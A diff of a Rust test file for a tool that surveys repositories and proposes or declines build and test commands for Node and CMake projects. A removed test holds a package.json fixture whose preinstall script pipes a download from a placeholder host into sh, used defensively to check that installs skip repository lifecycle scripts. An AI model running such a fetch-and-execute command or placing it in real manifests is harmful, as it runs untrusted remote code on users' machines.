@@ -207,66 +207,6 @@ fn every_proposed_program_is_a_bare_name_that_cannot_be_steered_by_the_repositor
 }
 
 #[test]
-fn a_node_project_is_declined_because_its_executed_test_count_cannot_be_observed() {
-    let directory = repository(&[(
-        "package.json",
-        r#"{"name":"a","scripts":{"test":"vitest run","lint":"eslint ."}}"#,
-    )]);
-    let survey = survey_project(
-        directory.path(),
-        Some(&tracked(&[
-            "package.json",
-            "package-lock.json",
-            "src/index.js",
-            "src/index.test.js",
-        ])),
-    );
-
-    assert!(
-        survey.commands.is_empty(),
-        "a gate whose executed count cannot be observed must not be proposed, commands: {:?}",
-        survey.commands
-    );
-    assert!(
-        survey.declines.iter().any(|decline| decline
-            .detail
-            .contains("no count of how many tests were executed")),
-        "the decline must say why, declines: {:?}",
-        survey.declines
-    );
-    assert!(
-        survey
-            .declines
-            .iter()
-            .any(|decline| decline.detail.contains("--command test=")),
-        "the decline must tell the operator what to declare instead"
-    );
-}
-
-#[test]
-fn no_install_command_is_ever_proposed_because_it_would_run_repository_lifecycle_scripts() {
-    let directory = repository(&[(
-        "package.json",
-        r#"{"name":"a","scripts":{"test":"vitest run","preinstall":"curl https://example.invalid | sh"}}"#,
-    )]);
-    let survey = survey_project(
-        directory.path(),
-        Some(&tracked(&[
-            "package.json",
-            "package-lock.json",
-            "src/index.test.js",
-        ])),
-    );
-    assert!(
-        !survey
-            .commands
-            .iter()
-            .any(|command| command.kind == CommandKind::Build),
-        "an install step would execute lifecycle scripts chosen by the repository"
-    );
-}
-
-#[test]
 fn a_python_module_below_the_root_carries_its_working_subdirectory() {
     let directory = repository(&[("services/api/pyproject.toml", "[project]\nname = \"api\"\n")]);
     let survey = survey_project(
@@ -346,4 +286,133 @@ fn a_source_file_holding_inline_tests_is_protected_even_though_its_path_is_not_a
     assert!(!declares_tests("pub fn parse() {}\n"));
     assert!(declares_tests("def test_rounding():\n    assert True\n"));
     assert!(declares_tests("func TestRounding(t *testing.T) {}\n"));
+}
+
+#[test]
+fn a_node_project_with_a_recognised_runner_is_proposed_a_counting_test_command() {
+    let directory = repository(&[(
+        "package.json",
+        r#"{"name":"a","scripts":{"test":"vitest run","lint":"eslint ."},"devDependencies":{"vitest":"^2.0.0"}}"#,
+    )]);
+    let survey = survey_project(
+        directory.path(),
+        Some(&tracked(&[
+            "package.json",
+            "package-lock.json",
+            "src/index.js",
+            "src/index.test.js",
+        ])),
+    );
+
+    let test = command_of(&survey, CommandKind::Test).expect("a test command is proposed");
+    assert_eq!(test.program, "npm");
+    assert_eq!(
+        test.report_format,
+        ReportFormat::NodeTestText,
+        "the executed count must be observable before a Node gate is proposed"
+    );
+
+    let install = command_of(&survey, CommandKind::Build).expect("an install command");
+    assert!(
+        install
+            .args
+            .iter()
+            .any(|argument| argument == "--ignore-scripts"),
+        "an install must not run lifecycle scripts chosen by the repository, args: {:?}",
+        install.args
+    );
+    let install_position = survey
+        .commands
+        .iter()
+        .position(|command| command.kind == CommandKind::Build)
+        .expect("an install command");
+    let test_position = survey
+        .commands
+        .iter()
+        .position(|command| command.kind == CommandKind::Test)
+        .expect("a test command");
+    assert!(install_position < test_position);
+}
+
+#[test]
+fn a_node_project_whose_runner_cannot_be_identified_is_declined() {
+    let directory = repository(&[(
+        "package.json",
+        r#"{"name":"a","scripts":{"test":"echo no tests && exit 0"}}"#,
+    )]);
+    let survey = survey_project(
+        directory.path(),
+        Some(&tracked(&[
+            "package.json",
+            "package-lock.json",
+            "src/a.test.js",
+        ])),
+    );
+    assert!(
+        command_of(&survey, CommandKind::Test).is_none(),
+        "a stub test script must never become a gate"
+    );
+    assert!(survey.declines.iter().any(|decline| decline
+        .detail
+        .contains("test runner could not be identified")));
+}
+
+#[test]
+fn a_node_project_without_a_lockfile_is_declined_because_it_cannot_be_installed() {
+    let directory = repository(&[(
+        "package.json",
+        r#"{"name":"a","scripts":{"test":"vitest run"},"devDependencies":{"vitest":"^2"}}"#,
+    )]);
+    let survey = survey_project(
+        directory.path(),
+        Some(&tracked(&["package.json", "src/index.test.js"])),
+    );
+    assert!(command_of(&survey, CommandKind::Test).is_none());
+    assert!(survey
+        .declines
+        .iter()
+        .any(|decline| decline.detail.contains("no tracked lockfile")));
+}
+
+#[test]
+fn a_cmake_project_that_ignores_its_build_directory_is_proposed_a_counting_test_command() {
+    let directory = repository(&[
+        ("CMakeLists.txt", "cmake_minimum_required(VERSION 3.16)\n"),
+        (".gitignore", "build/\n"),
+    ]);
+    let survey = survey_project(
+        directory.path(),
+        Some(&tracked(&["CMakeLists.txt", ".gitignore", "src/main.cpp"])),
+    );
+
+    let test = command_of(&survey, CommandKind::Test).expect("a test command is proposed");
+    assert_eq!(test.program, "ctest");
+    assert!(
+        test.args
+            .iter()
+            .any(|argument| argument == "--no-tests=error"),
+        "a configured project with no tests must fail rather than pass, args: {:?}",
+        test.args
+    );
+    assert_eq!(test.report_format, ReportFormat::CTestText);
+
+    let builds: Vec<_> = survey
+        .commands
+        .iter()
+        .filter(|command| command.kind == CommandKind::Build)
+        .collect();
+    assert_eq!(builds.len(), 2, "cmake must configure and then build");
+}
+
+#[test]
+fn a_cmake_project_that_does_not_ignore_its_build_directory_is_declined() {
+    let directory = repository(&[("CMakeLists.txt", "cmake_minimum_required(VERSION 3.16)\n")]);
+    let survey = survey_project(
+        directory.path(),
+        Some(&tracked(&["CMakeLists.txt", "src/main.cpp"])),
+    );
+    assert!(command_of(&survey, CommandKind::Test).is_none());
+    assert!(survey.declines.iter().any(|decline| decline
+        .detail
+        .contains("would appear in the candidate diff")));
 }
